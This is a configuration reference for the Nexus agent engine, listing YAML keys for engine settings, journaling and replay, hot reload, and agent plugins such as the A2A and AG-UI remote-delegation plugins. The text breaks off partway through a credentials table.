# Configuration Reference

Authoritative reference for every YAML configuration key recognized by the Nexus
engine and its plugins. Tables are derived from each plugin's `Init()` (and any
parser helpers it calls) — not from prose docs. If you change a config key in
source, update this page in the same commit.

> **Maintenance rule.** Any addition, removal, rename, default change, or type
> change to a configuration key — at the engine level or in any plugin —
> **must** be reflected in this file. Per-plugin pages may add narrative, but
> this page is the single source of truth.

## Conventions

- **Type column** uses YAML-native names (`string`, `int`, `bool`, `float`,
  `duration`, `list`, `map`). `duration` is parsed by Go's `time.ParseDuration`
  (e.g. `30s`, `1m`, `5m`).
- **Default column** shows the value used when the key is absent. `*(none)*`
  means no value is set; `*(required)*` means the plugin will fail to start
  without it; `*(env)*` means the value is read from an environment variable.
- **Path expansion.** Every filesystem path supplied via configuration —
  engine `sessions.root`, plugin `path`, `dir`, `file`, `cache_dir`,
  `scan_paths`, `system_prompt_file`, `schema_file`, `patterns_file`,
  `word_files`, `base_dir`, `working_dir`, `path_dirs`, ingest `watch[].path`,
  etc. — is funneled through `engine.ExpandPath`. Bare `~` resolves to the
  user's home directory; `~/foo` resolves to `<home>/foo`. Relative paths are
  resolved against the engine's working directory and not modified.

## Validation

Configuration is validated **strictly at boot**, after YAML loading and before
any plugin's `Init()` runs. The engine compiles the top-level schema plus every
active plugin's schema (when the plugin advertises one) and validates each
config block against it. **Validation errors abort boot** — they are aggregated
across every plugin so a single boot attempt surfaces every issue at once,
sorted, with the offending key path on each line:

```
config validation failed:
  - plugins.nexus.gate.token_budget.warning_threshold: unknown key "warning_threshold"
  - plugins.nexus.tool.web.timeoutt: unknown key "timeoutt" (did you mean "timeout"?)
2 errors; aborting boot
```

**Unknown keys fail boot.** Plugin schemas declare `additionalProperties: false`
at every object level, so a typo in a key name is a hard error rather than a
silently-ignored value. The validator emits a "did you mean" suggestion when a
close match exists in the schema's declared keys (Levenshtein distance ≤ 3 and
strictly less than half the candidate's length). This guarantees that the only
keys you can write in YAML are the ones the engine actually reads — silent
typos are not possible for plugins that ship a schema.

**Deprecated keys log a warning** but do not fail boot. Schemas mark these with
`deprecated: true`. Move off the key when convenient; deprecation warnings are
the engine's signal that a future minor release may delete the shim.

**Plugins without a schema** (legacy or third-party) are skipped with a `debug`
log. They are not blocked from booting. The engine's own top-level keys
(`core`, `engine`, `capabilities`, `plugins.active`, `journal`) are always
validated against the engine schema.

### Schema authoring

Plugins expose their schema by implementing the optional
`engine.ConfigSchemaProvider` interface (defined in
`pkg/engine/config_validation.go`). Conventions:

- The schema lives at `plugins/<id>/schema.json` and is `//go:embed`-ed by a
  small `schema.go` in the same package; the plugin's `ConfigSchema()` method
  returns the embedded bytes.
- Schemas declare `"$schema": "https://json-schema.org/draft/2020-12/schema"`
  and **must** set `"additionalProperties": false` on every object level so
  unknown keys are caught.
- Mark deprecated keys with `"deprecated": true` (a sibling of `type`,
  `description`, etc.). The validator walks the schema once and warns when a
  deprecated key is present in the user's config.
- The schema is canonical for the plugin's config map — what `Init()` actually
  reads. Schema drift from real consumption is a bug; the smoke test in
  `pkg/engine/configs_smoke_test.go` validates every shipped YAML against
  every active plugin's schema and is the canary for that drift.

## Top-level structure

```yaml
core:           # engine-level settings
engine:         # engine resilience knobs (shutdown drain, ...)
capabilities:   # capability → plugin-ID pinning (optional)
journal:        # durable per-session event log (always on; tunables only)
plugins:
  active: []    # plugin IDs (with optional /instance suffix)
  <plugin.id>:  # per-plugin config map
    key: value
```

| Key            | Type   | Default | Description                                                                 |
|----------------|--------|---------|-----------------------------------------------------------------------------|
| `core`         | map    | *(see core section)* | Engine-level settings (logging, sessions, models). |
| `engine`       | map    | *(see engine section)* | Engine resilience knobs (shutdown drain budget). |
| `capabilities` | map    | *(empty)* | Pin capability names to specific provider plugin IDs (e.g. `search.provider: nexus.search.brave`). Overrides default resolution (first active provider). |
| `journal`      | map    | *(see journal section)* | Tuning knobs for the always-on event journal. The journal cannot be disabled. |
| `plugins.active` | list | `[]`    | Plugin IDs to activate. Order doesn't matter — `Requires()` and `Dependencies()` are resolved automatically. Multi-instance plugins use a slash suffix: `nexus.agent.subagent/researcher`. |
| `plugins.<id>` | map    | *(none)* | Per-plugin configuration. Keys other than `active` are treated as plugin IDs. |

## Core engine

### `core`

| Key                            | Type     | Default                | Description |
|--------------------------------|----------|------------------------|-------------|
| `log_level`                    | string   | `info`                 | Global log level: `debug`, `info`, `warn`, `error`. |
| `tick_interval`                | duration | `1s`                   | Interval for the internal `core.tick` heartbeat. |
| `max_concurrent_events`        | int      | `100`                  | Maximum concurrent event handlers across the bus. |
| `logging.bootstrap_stderr`     | bool     | `false`                | Register a stderr sink at engine construction so pre-sink slog records appear on the terminal. **Rejected** at validation time when any of `nexus.io.tui`, `nexus.io.browser`, `nexus.io.wails` is active. |
| `logging.buffer_size`          | int      | `DefaultLogRingSize`   | Capacity of the log/event ring buffers. Values `<= 0` use the default. |
| `sessions.root`                | string   | `~/.nexus/sessions`    | Base directory for session workspaces. |
| `sessions.retention`           | string   | `30d`                  | Retention policy for old sessions. |
| `sessions.id_format`           | string   | `timestamp`            | Session ID format: `timestamp`, `datetime_short`. |
| `agent_id`                     | string   | *(empty)*              | Partitions per-agent storage and other per-agent state. Set by multi-agent embedders (the desktop shell). Empty in CLI / single-agent embedders, which collapses agent-scope storage to app-scope. |
| `storage.root`                 | string   | `~/.nexus`             | Data root for app- and agent-scope per-plugin storage. App-scope `.db` files land at `<root>/plugins/<pluginID>/store.db`; agent-scope at `<root>/agents/<agent_id>/plugins/<pluginID>/store.db`. |
| `storage.busy_timeout_ms`      | int      | `5000`                 | SQLite `busy_timeout` PRAGMA per handle (milliseconds). |
| `storage.cache_size_kb`        | int      | `2048`                 | SQLite `cache_size` PRAGMA per handle (negative-form, in KiB). |
| `storage.pool_max_idle`        | int      | `2`                    | `*sql.DB.SetMaxIdleConns` per handle. |
| `storage.pool_max_open`        | int      | `4`                    | `*sql.DB.SetMaxOpenConns` per handle. |
| `models`                       | map      | *(empty)*              | Model role registry — see `core.models` below. |

### `core.models`

Maps role names → model configurations. Roles can be:

- **single model** — map with `provider`, `model`, `max_tokens`,
- **fallback chain** — list of single-model maps (tried in order on
  non-retryable error or exhausted retries; coordinated by
  `nexus.provider.fallback`),
- **fanout role** — map with `fanout: true` and a `providers:` list (dispatched
  in parallel by `nexus.provider.fanout`).

| Key (per role)         | Type   | Default | Description |
|------------------------|--------|---------|-------------|
| `default`              | string | `balanced` | Name of the role used when a request specifies no role. |
| `<role>.provider`      | string | *(required)* | Plugin ID of the LLM provider (e.g. `nexus.llm.anthropic`). |
| `<role>.model`         | string | *(required)* | Model identifier as understood by the provider. |
| `<role>.max_tokens`    | int    | *(provider default)* | Maximum response tokens. |
| `<role>.fanout`        | bool   | `false` | If `true`, treat as fanout role; `providers:` list is dispatched in parallel. |
| `<role>.providers`     | list   | *(required if `fanout: true`)* | List of model configs for fanout dispatch. |

Example:

```yaml
core:
  models:
    default: balanced
    reasoning:
      provider: nexus.llm.anthropic
      model: claude-opus-4-7
      max_tokens: 16384
    balanced:
      - provider: nexus.llm.anthropic
        model: claude-sonnet-4-6
        max_tokens: 8192
      - provider: nexus.llm.openai           # fallback
        model: gpt-4o
        max_tokens: 8192
    panel:
      fanout: true
      providers:
        - provider: nexus.llm.anthropic
          model: claude-sonnet-4-6
        - provider: nexus.llm.gemini
          model: gemini-2.5-pro
```

A role missing from `core.models` whose name contains a hyphen is treated as a
raw model ID with no provider (backward-compat). Otherwise resolution fails.

## Engine

Engine-level resilience knobs that don't belong under `core` (which is for
runtime settings like log level and tick interval) and aren't journal-specific.

```yaml
engine:
  shutdown:
    drain_timeout: 30s
  config_watch:
    enabled: false      # opt in to fsnotify hot-reload
    debounce: 1s
```

| Key                            | Type     | Default | Description |
|--------------------------------|----------|---------|-------------|
| `shutdown.drain_timeout`       | duration | `30s`   | Maximum time the engine waits for in-flight bus dispatches to complete on `Shutdown` before the plugin teardown phase begins. Acts as a floor: a plugin implementing `engine.DrainOverride` can extend (but not shorten) the effective window so a single batch poller or MCP server can flush without operators bumping the global setting. Sub-second values are accepted but rarely useful. |
| `config_watch.enabled`         | bool     | `false` | When `true`, the CLI starts an `fsnotify` watcher on the `-config` path and calls `Engine.ReloadConfig` on every debounced edit. Default off because production deploys often touch the config file mid-rollout and operators rarely want auto-reload during such windows. SIGHUP and the browser admin endpoint remain available regardless. |
| `config_watch.debounce`        | duration | `1s`    | Window across which `fsnotify` write/create events on the same file are coalesced into a single reload. Editors commonly fire two or three Write events per save; `1s` is well above that storm but short enough that the operator perceives the reload as instant. |

### Hot reload

The engine supports applying a new config to a running process without
restarting any unaffected plugins. The flow is two-phase:

1. **Validate phase (atomic).** The new config is run through the same
   schema validation as boot; capability provider identity is pinned (a
   plugin advertising `memory.history` cannot be replaced by another
   provider mid-flight); the diff between current and new active sets is
   computed. Any failure here returns an error and leaves the engine
   untouched.
2. **Apply phase (best-effort).** The diff is walked: removed plugins
   shut down, in-place reloaders accept their new config, restart-only
   plugins are torn down and re-initialized, and added plugins run the
   full lifecycle. Engine-level fields (`drain_timeout`, `config_watch`)
   are swapped atomically before per-plugin work.

A reload that fails midway through the apply phase logs the error and
surfaces it to the caller; the engine is left in a best-effort consistent
state. True rollback is not attempted because "undoing" a `Shutdown` is
not generally possible.

**Triggers:**

- **`SIGHUP`** to the CLI process re-reads the original `-config` path
  and applies the result. (`SIGINT` and `SIGTERM` continue to terminate
  the engine.)
- **`POST /admin/reload-config`** on the browser plugin's HTTP server.
  Body is empty (re-read original path) or `{"path": "/abs/path/to/new.yaml"}`
  for ad-hoc paths. No auth layer yet — alpha-only; front with a reverse
  proxy if exposed.
- **`fsnotify` watcher** on the original path. Off by default; opt in
  via `engine.config_watch.enabled: true`. Debounced by
  `engine.config_watch.debounce` to absorb editor save bursts.

**Plugin opt-in: `ConfigReloader`.** A plugin that implements

```go
type ConfigReloader interface {
    ReloadConfig(old, new map[string]any) error
}
```

receives the in-place hook on a config-only change instead of going
through `Shutdown` → `Init` → `Ready`. Implementations must be
transactional from the bus's perspective: returning an error must leave
the plugin in its prior state. Plugins that don't implement the
interface go through the full restart path; both work, the in-place
hook is just an optimization for plugins where a restart would drop
in-progress work (active streams, bound listeners) the operator would
notice.

**Capability provider identity is pinned.** Hot-reload rejects any
config change that would resolve a currently-bound capability (e.g.
`memory.history`) to a different concrete provider. The session has
in-flight state bound to the existing provider; a silent swap would
strip the operator's history. Restart the engine to change capability
providers.

## Journal

The journal is the engine's always-on durable event log. Every dispatched
bus event lands as a JSONL envelope at
`<sessions.root>/<session_id>/journal/events.jsonl` with a monotonic per-
session sequence number, the parent dispatch's seq (best-effort), and the
veto outcome for `before:*` events. The journal cannot be disabled — it is
core infrastructure underpinning crash recovery, deterministic replay, and
observability projections.

```yaml
journal:
  fsync: turn-boundary       # turn-boundary | every-event | none
  retain_days: 30
  rotate_size_mb: 4
  exclude_events:            # event types the journal must not record
    - core.tick
```

| Key              | Type     | Default          | Description |
|------------------|----------|------------------|-------------|
| `fsync`          | string   | `turn-boundary`  | Disk-flush policy. `turn-boundary` fsyncs once per `agent.turn.end` (good throughput, recovers to last completed turn). `every-event` fsyncs after every envelope (strongest crash guarantee). `none` skips explicit fsync (test-only). |
| `retain_days`    | int      | `30`             | Age in days past which a session's journal directory is removed on engine boot. `0` disables sweeping. In-flight sessions are never touched. |
| `rotate_size_mb` | int      | `4`              | Active segment size threshold (MiB). When `agent.turn.end` lands and the active segment exceeds this, it is compressed into `events-NNN.jsonl.zst` and the active segment is truncated. |
| `exclude_events` | []string | `["core.tick"]`  | Event types the journal must not record. Excluded events still dispatch to bus subscribers (otel, eval, custom plugins); only the durable log skips them, and their seq is not consumed so on-disk envelopes stay gap-free. Default suppresses the engine heartbeat. Set to `[]` to record everything. |

### Disk layout

```
~/.nexus/sessions/<id>/journal/
  header.json                 # schema_version, created_at, fsync_mode, session_id
  events.jsonl                # active segment (append-only)
  events-001.jsonl.zst        # rotated, zstd-compressed
  events-002.jsonl.zst
  cache/                      # args-keyed tool result cache
    <tool_id>/
      <sha256>.json           # one file per (tool, canonical_args) pair
```

### Tool result cache

Every `tool.invoke` / `tool.result` pair is recorded under `journal/cache/`
keyed by `sha256(tool_id || canonical_args)`. During replay, the
short-circuit helper consults the cache first — same args produce the
same result regardless of dispatch order, so replay survives memory-state
divergence between the original and replay runs. On cache miss, the
helper falls back to the FIFO stash seeded by the coordinator from the
journal's `tool.result` events.

The canonical args hash sorts keys recursively, so two semantically
equivalent argument maps with different key iteration order map to the
same cache file.

### Journal projections

Plugins that need to derive files from event streams register a
projection via `Journal.SubscribeProjection(types, handler)`. The
handler fires on the writer's drain goroutine after the envelope lands
on disk, so derived files always lag the durable record by zero
envelopes. Projections also drive post-mortem regeneration:
`journal.ProjectFile(dir, types, handler)` walks an existing journal
and feeds the same handler — a derived file deleted between runs will
rebuild from the journal at the next boot.

The shipped `nexus.observe.thinking` plugin no longer uses this hook
itself: its `thinking.step` and `plan.progress` events are already in
the journal alongside every other event, so the plugin acts purely as
a UI feature flag for shells that want to surface thinking. Custom
plugins that need their own derived view should adopt the projection
pattern.

### Deterministic replay

`bin/nexus -config <path> -replay <session-id>` re-runs a journaled session
without external calls. The Anthropic / OpenAI / Gemini providers and the
side-effecting tools (`shell`, `file`, `code_exec`, `web`, `pdf`, `ask_user`),
along with the `nexus.control.hitl` plugin's `hitl.responded` events,
detect replay mode and emit the next journaled `llm.response` /
`tool.result` from a FIFO stash seeded from the source journal in seq
order. The replay coordinator drives `io.input` events; the live agent
loop reacts as if the inputs were fresh.

Replay produces functional equivalence (same final assistant outputs,
same memory state) rather than byte-identical event re-emission. Side-
effecting plugins expose a `LiveCalls()` counter that stays at zero
during replay — tests assert this to catch regressions.

### Crash recovery

`bin/nexus -config <path> -recall <session-id>` resumes a session whose
journal ended mid-turn. The engine detects the partial turn via
`coord.IsPartialTurn()`, restores conversational memory from
`context/conversation.jsonl`, and re-emits the `io.input` that started
the unfinished turn so the live ReAct loop restarts it.

Phase 3 minimum: the partial turn restarts from scratch rather than
mid-step resume. Mid-step resume (replay-stash-short-circuit the
completed prefix, then live-fire the unanswered `tool.invoke`) is a
future PR. Re-firing the input after a crash mints fresh seqs that
append to the same journal alongside the orphaned partial-turn events;
a subsequent `--replay` of a crash-resumed session sees both the
orphaned and the re-fired `io.input`.

## Plugin activation

```yaml
plugins:
  active:
    - nexus.io.tui
    - nexus.llm.anthropic
    - nexus.agent.react
    - nexus.agent.subagent/researcher   # multi-instance suffix
    - nexus.agent.subagent/writer
```

Each entry in `active` may be followed by `/<instance>` to register a second
copy of a multi-instance plugin (e.g. subagents). The base plugin ID + instance
suffix forms the full ID used for per-plugin config:

```yaml
plugins:
  nexus.agent.subagent/researcher:
    model_role: reasoning
    tool_name: spawn_researcher
```

A plugin with no configuration still parses cleanly without an explicit entry,
but you may declare an empty map for clarity:

```yaml
plugins:
  nexus.tool.file: {}
  nexus.observe.thinking: {}
```

---

## Agents

### `nexus.agent.react`

Source: `plugins/agents/react/plugin.go`.

| Key                      | Type     | Default     | Description |
|--------------------------|----------|-------------|-------------|
| `planning`               | bool     | `false`     | Emit `plan.request` before iterating; defers to a planner plugin. |
| `model_role`             | string   | *(default)* | Role name from `core.models`. |
| `system_prompt`          | string   | *(none)*    | Inline system prompt (overrides `system_prompt_file`). |
| `system_prompt_file`     | string   | *(none)*    | Path to file containing the system prompt. |
| `parallel_tools`         | bool     | `false`     | Run multiple tool calls from a single LLM response in parallel. |
| `max_concurrent`         | int      | `4`         | Concurrency ceiling when `parallel_tools: true`. |
| `tool_choice`            | string \| map | *(none)* | Constrain tool selection. See "Tool choice" below. |

Iteration limits are **not** an agent setting — enforce them with
`nexus.gate.endless_loop`. ReAct's required capabilities (`memory.history`,
`control.cancel`, `tool.catalog`) are auto-activated by `Requires()` when no
provider for those capabilities is already in `plugins.active`.

#### Tool choice

`tool_choice` accepts:

- a string shorthand — `tool_choice: required` (or `auto`, `any`, `none`),
- a map — `tool_choice: { mode: tool, name: read_file }`,
- a sequence — `tool_choice: { sequence: [{ mode: required }, { mode: auto }] }`
  applied per iteration; the last entry sticks.

Dynamic overrides arrive via `agent.tool_choice` events with `duration: once`
(consumed after one iteration) or `sticky` (until cleared).

### `nexus.agent.planexec`

Source: `plugins/agents/planexec/plugin.go`.

| Key                    | Type   | Default      | Description |
|------------------------|--------|--------------|-------------|
| `execution_model_role` | string | `balanced`   | Role used to execute each step. |
| `replan_on_failure`    | bool   | `true`       | Re-plan remaining work when a step fails (max 2 replans). |
| `approval`             | string | `never`      | Plan approval mode: `always` (block until user approves) or `never`. |
| `system_prompt`        | string | *(none)*     | Inline system prompt. |
| `system_prompt_file`   | string | *(none)*     | Path to file containing the system prompt. |

Step iteration and step counts are managed internally by the planner plugin
that emits `plan.result`; they are not configured here.

### `nexus.agent.subagent`

Source: `plugins/agents/subagent/plugin.go`. Multi-instance: register multiple
copies via `nexus.agent.subagent/<suffix>`.

| Key                   | Type   | Default                                | Description |
|-----------------------|--------|----------------------------------------|-------------|
| `model_role`          | string | *(default)*                            | Role used for the subagent's LLM calls. |
| `system_prompt`       | string | *(none)*                               | Inline system prompt. |
| `system_prompt_file`  | string | *(none)*                               | Path to file containing the system prompt. |
| `tool_name`           | string | `spawn_<suffix>` or `spawn_subagent`   | Name of the spawn tool registered with the catalog. |
| `tool_description`    | string | *(auto)*                               | Description shown to the parent agent. |

Depends on `nexus.agent.react`.

### `nexus.agent.orchestrator`

Source: `plugins/agents/orchestrator/plugin.go`.

| Key                        | Type   | Default      | Description |
|----------------------------|--------|--------------|-------------|
| `max_workers`              | int    | `5`          | Concurrency cap for worker subagents. |
| `max_subtasks`             | int    | `8`          | Hard cap on subtasks (excess truncated). |
| `worker_max_iterations`    | int    | `10`         | Iteration limit per worker (enforced via `gate.endless_loop`). |
| `orchestrator_model_role`  | string | `reasoning`  | Role used for decomposition. |
| `worker_model_role`        | string | `balanced`   | Role used by workers. |
| `synthesis_model_role`     | string | `balanced`   | Role used for the final synthesis. |
| `fail_fast`                | bool   | `false`      | Cancel remaining workers on the first failure. |
| `system_prompt`            | string | *(none)*     | Inline system prompt. |
| `system_prompt_file`       | string | *(none)*     | Path to file containing the system prompt. |

Depends on `nexus.agent.subagent`.

### `nexus.agent.postures`

Source: `plugins/agents/postures/plugin.go`. Loads `AgentPosture` YAML files
from the configured directories and advertises the `posture.registry`
capability consumed by `nexus.agent.delegate`. fsnotify watches each directory
for live edits; active sub-sessions keep their old posture, new invocations
resolve the new one. See [Postures](../architecture/postures.md) for the
`AgentPosture` schema.

| Key           | Type      | Default | Description |
|---------------|-----------|---------|-------------|
| `scan_dirs`   | []string  | `[]`    | Directories scanned for `*.yaml` / `*.yml` posture files. Each entry runs through `engine.ExpandPath` so `~` expands. |
| `debounce_ms` | int       | `250`   | fsnotify reload debounce in milliseconds. |

### `nexus.agent.delegate`

Source: `plugins/agents/delegate/plugin.go`. Exposes the `delegate` tool that
the LLM calls to invoke a registered posture. Requires the `posture.registry`
capability (typically provided by `nexus.agent.postures`). Enforces budgets
and recursion depth defined on each posture; results cached by posture
version + task + context hash so posture edits invalidate stale entries.
See [Sub-agent delegation](../architecture/delegate.md).

| Key          | Type | Default | Description |
|--------------|------|---------|-------------|
| `max_depth`  | int  | `3`     | Hard cap on sub-agent recursion depth across all postures. Individual postures may set a lower cap via `max_recursion_depth`. |
| `cache_size` | int  | `256`   | Capacity of the in-process LRU result cache (entries, not bytes). Zero disables eviction; the cache grows unbounded. |
| `cache`      | bool | `true`  | Set `false` to disable result caching entirely. |

### `nexus.agent.agui_remote`

Source: `plugins/agents/aguiremote/plugin.go`. Surfaces one or more **remote
AG-UI agents** as delegate/subagent targets. Each configured agent registers an
LLM-facing tool (default `delegate_agui_<name>`); when the parent agent calls
it, the plugin builds an AG-UI `RunAgentInput` from the delegated task, runs the
remote agent over the AG-UI wire (HTTP POST + SSE) via the reusable AG-UI
client, maps the remote run's event stream onto the Nexus bus (text deltas →
`io.output`; tool activity + message boundaries → `subagent.*`), and returns the
remote run's terminal outcome as the tool result. Failures (remote `RunError`,
timeout, transport error, auth rejection, unresolved interrupt) surface as a
clean tool error. Per-call timeout enforces budget; results are cached by
endpoint + task + context hash. See [Sub-agent delegation](../architecture/delegate.md).

| Key               | Type | Default | Description |
|-------------------|------|---------|-------------|
| `agents`          | list | *(required)* | Non-empty list of remote AG-UI agents to expose. Each entry is a mapping (see below). |
| `timeout_seconds` | int  | `120`   | Default per-call timeout (seconds) applied to every remote agent. Overridable per agent and per call. |
| `cache_size`      | int  | `128`   | Capacity of the in-process LRU result cache (entries, not bytes). Zero disables eviction; the cache grows unbounded. |
| `cache`           | bool | `true`  | Set `false` to disable result caching entirely. |

Each `agents[]` entry:

| Key                | Type   | Default                  | Description |
|--------------------|--------|--------------------------|-------------|
| `name`             | string | *(required)*             | Human-friendly identifier; used to derive the default tool name. |
| `endpoint`         | string | *(required)*             | Full AG-UI POST endpoint URL (e.g. `https://host/agui`). |
| `tool_name`        | string | `delegate_agui_<name>`   | Override the LLM-facing tool name. |
| `description`      | string | *(auto)*                 | Override the tool description shown to the LLM. |
| `bearer_token`     | string | *(none)*                 | Static bearer token for the `Authorization` header. Prefer `bearer_token_env`. |
| `bearer_token_env` | string | *(none)*                 | Name of an environment variable holding the bearer token. Read at `Init`; used only when `bearer_token` is unset. |
| `timeout_seconds`  | int    | *(plugin default)*       | Per-agent default timeout (seconds), overriding the plugin-level `timeout_seconds`. |

### `nexus.agent.a2a_remote`

Source: `plugins/agents/a2aremote/`. The **outbound** half of Nexus's
[A2A interoperability](../guides/a2a.md): where
[`nexus.io.a2a`](#nexusioa2a) *serves* this instance as an A2A agent, this plugin
lets a Nexus agent *call* remote A2A agents. Each configured remote registers one
LLM-facing tool (default `delegate_a2a_<name>`); a call sends the delegated task
over the A2A wire through `pkg/a2a/a2aclient`, and folds the remote task's final
text and artifacts back into the tool result under XML tag boundaries.

Remotes come from **configuration only** — the tool schema exposes no URL, host
or endpoint parameter, so a model cannot point the instance at an arbitrary
address. See [Remote A2A Agents](../plugins/agents/a2a-remote.md).

Each remote's **Agent Card is fetched lazily, on first use, never at boot**: an
unreachable remote must not be able to fail engine startup. Until the card
resolves the tool carries the configured `description`; the first successful call
replaces it with a description built from the card's own `skills` and
re-registers the tool once.

Every failure — unreachable card, refused binding, protocol error, dead stream,
exhausted budget, a task that ends `FAILED` — becomes a clean `tool.result`
error, never an engine-level failure.

A remote that parks at `INPUT_REQUIRED` is **not** a failure: the question is
raised on the local bus as `hitl.requested`, the human's answer resumes the
remote task with the same `taskId` and `contextId`, and the delegation carries on.
The delegating model never sees the question. See the `hitl` block below.

| Key                   | Type   | Default | Description |
|-----------------------|--------|---------|-------------|
| `agents`              | list   | *(required)* | Non-empty list of remote A2A agents to expose. Each entry is a mapping (see below). |
| `cache`               | bool   | `true`  | Set `false` to disable result caching entirely. |
| `cache_size`          | int    | `128`   | Capacity of the in-process LRU result cache (entries, not bytes). Zero disables eviction. |
| `max_depth`           | int    | `3`     | Hard cap on delegation depth across all remotes. Zero disables the cap. A posture's `max_recursion_depth` may narrow it further. |
| `binding`             | string | `jsonrpc` | Default protocol binding. One of `jsonrpc`, `json-rpc`, `http+json`, `rest`. |
| `validate_card`       | bool   | `true`  | Default for checking a fetched Agent Card against the specification's required fields. |
| `stream`              | bool   | `true`  | Default for using the streaming operation. `false` forces a blocking `SendMessage`. |
| `timeout`             | duration | `5m`  | Default whole-call deadline covering discovery, the message and the stream. |
| `request_timeout`     | duration | `60s` | Default deadline for a control-plane call (Agent Card fetch, `GetTask`, `CancelTask`). `"0s"` disables it. |
| `message_timeout`     | duration | `0s`  | Default deadline for a non-streaming `SendMessage`. Zero means none — a blocking send legitimately takes as long as the remote's work does. |
| `stream_open_timeout` | duration | `30s` | Default deadline for a streaming call's response *headers*. `"0s"` disables it. |
| `stream_idle_timeout` | duration | `5m`  | Default bound on total silence on an open stream. `"0s"` disables it. |
| `progress`            | bool   | `true`  | Republish a remote run's incremental progress onto the local bus as `io.output` and `subagent.iteration`, so a long delegation is visible to the TUI, browser, AG-UI and A2A-serve transports. |
| `hitl`                | map    | *(see below)* | Chained human-in-the-loop policy for a remote that parks at `INPUT_REQUIRED`. |
| `extensions`          | list   | *(the Nexus extension)* | A2A protocol extension URIs to request via the `A2A-Extensions` service parameter. A server activates only what a client asked for. **Defaults to the [Nexus extension](../guides/a2a.md#the-nexus-extension-telemetry-a2a-has-no-field-for) URI**, because this plugin consumes a remote Nexus instance's telemetry to republish its progress; a remote that does not know the extension ignores the header. Set `[]` to request none. |
| `retry`               | map    | *(see below)* | Default retry policy for outbound calls. |

Every key from `binding` down is a **default**; each `agents[]` entry may
override it. An agent-level `extensions` list replaces the inherited one
wholesale rather than merging, so an empty list means "declare none".

Each `agents[]` entry:

| Key                   | Type   | Default | Description |
|-----------------------|--------|---------|-------------|
| `name`                | string | *(required)* | Human-friendly identifier; used to derive the default tool name. |
| `base_url`            | string | *(required\*)* | Base URL the remote is served under — the origin and optional path prefix, **not** an operation endpoint. The Agent Card is fetched from `/.well-known/agent-card.json` beneath it. Required unless `jsonrpc_endpoint` or `rest_endpoint` pins an endpoint. |
| `jsonrpc_endpoint`    | string | *(none)* | Pin the JSON-RPC endpoint URL, skipping Agent Card discovery for it. |
| `rest_endpoint`       | string | *(none)* | Pin the HTTP+JSON base URL — the prefix operation paths hang off, not one operation URL. |
| `tool_name`           | string | `delegate_a2a_<name>` | Override the LLM-facing tool name. The default lowercases `name` and collapses non-alphanumeric runs to `_`. |
| `description`         | string | *(auto)* | Tool description used **until** the Agent Card resolves. Once it does, the description is rebuilt from the card's own skills. |
| `posture`             | string | *(none)* | Registered `AgentPosture` supplying this remote's timeout and recursion-depth cap. Requires the `posture.registry` capability (`nexus.agent.postures`). |
| `binding`             | string | *(plugin default)* | Per-agent override. |
| `validate_card`       | bool   | *(plugin default)* | Per-agent override. |
| `stream`              | bool   | *(plugin default)* | Per-agent override. |
| `timeout`             | duration | *(plugin default)* | Per-agent override. |
| `request_timeout`     | duration | *(plugin default)* | Per-agent override. |
| `message_timeout`     | duration | *(plugin default)* | Per-agent override. |
| `stream_open_timeout` | duration | *(plugin default)* | Per-agent override. |
| `stream_idle_timeout` | duration | *(plugin default)* | Per-agent override. |
| `progress`            | bool   | *(plugin default)* | Per-agent override. |
| `hitl`                | map    | *(plugin default)* | Per-agent override, key by key: a block setting only `enabled` leaves `input_timeout` and `max_rounds` inherited. |
| `extensions`          | list   | *(plugin default)* | Per-agent override; replaces rather than merges. |
| `retry`               | map    | *(plugin default)* | Per-agent override. |
| `credentials`         | map    | *(none)* | Credential this instance presents to **this** remote. Per agent only — see below. |

The `hitl` block, at either level:

| Key             | Type     | Default | Description |
|-----------------|----------|---------|-------------|
| `enabled`       | bool     | `true`  | Route a remote's `INPUT_REQUIRED` question to a human via `hitl.requested`, and resume the remote task with the answer. `false` restores the pre-chaining behaviour: a parked task becomes a clean tool error carrying the question. |
| `input_timeout` | duration | `15m`   | Deadline for **one** question waiting on a human. The outbound twin of `nexus.io.a2a`'s `tasks.input_timeout`. `"0s"` removes this deadline specifically. |
| `max_rounds`    | int      | `4`     | How many times one delegated call may bounce a question back to the human. `0` removes the cap. |

**Two deadlines run while a task is parked, and the earlier one wins.** The
whole-call `timeout` keeps running — a remote waiting on a human is still work
this session authorized, and pausing the budget is how an unanswered question
pins a session for ever — and `hitl.input_timeout` bounds the individual
question. With the `5m` default `timeout` the **call budget expires first**, so
`input_timeout` only bites once `timeout` is raised; an operator who expects a
remote to ask questions should raise both. Whichever fires, the outcome is the
same and the tool error names the deadline that fired: the question is retracted
with `hitl.cancel`, the remote task is cancelled with `CancelTask`, and the
delegating model is told the question went unanswered **and told not to answer it
itself**.

`AUTH_REQUIRED` is deliberately **not** routed to a human — no answer a person
types into a chat is a credential — and reports that the agent's `credentials`
need configuring.

Anything a human answered is **never cached**. A person's answer is a decision
made at a moment, and replaying it for a later identical task would apply that
decision again without asking.

The `credentials` block exists **only** inside an `agents[]` entry. There is
deliberately no plugin-level default: a default credential silently applied to a
remote added later is how a token reaches a host it was never issued for.

Everything a credentials block can be wrong about is checked at **`Init`**: an
unset environment variable, a key belonging to a different `type`, an unreadable
or mismatched client certificate, or an OAuth2 remote with no way to reach a
token endpoint each fail boot with a message naming the agent and the key — not
a `401` on the first delegation. **No credential value is ever logged**, on any
path, including failures.

| Key    | Type   | Default | Description |
|--------|--------|---------|-------------|
| `type` | string | *(required)* | One of `none`, `bearer`, `oauth2_client_credentials`, `mtls`. The types are mutually exclusive; a key belonging to another type is rejected at boot. |

`type: bearer` — a static token, following the same `api_key` / `api_key_env`
convention the LLM providers use:

| Key         | Type   | Default | Description |
|-------------|--------|---------|-------------|
| `token`     | string | *(none)* | The token, inline. Takes precedence over `token_env` when both are set. Prefer `token_env`; an inline secret lives in the config file. |
| `token_env` | string | *(none)* | Name of an environment variable holding the token. Read once at `Init`; a variable that is unset or empty **fails boot**. |
| `header`    | string | `Authorization` | Header the token rides in. |
| `scheme`    | string | `Bearer` | The scheme word before the token. Set it to `""` to send the bare token, which is what an `X-Api-Key` style header wants. |

`type: oauth2_client_credentials` — the RFC 6749 §4.4 machine-to-machine grant,
implemented over `net/http` (no `golang.org/x/oauth2` dependency). The token is
cached and refreshed ahead of expiry, and a burst of concurrent calls triggers
**one** token request, not one per caller:

| Key                 | Type     | Default | Description |
|---------------------|----------|---------|-------------|
| `client_id`         | string   | *(none)* | The client id, inline. Prefer `client_id_env`. |
| `client_id_env`     | string   | *(none)* | Name of an environment variable holding the client id. |
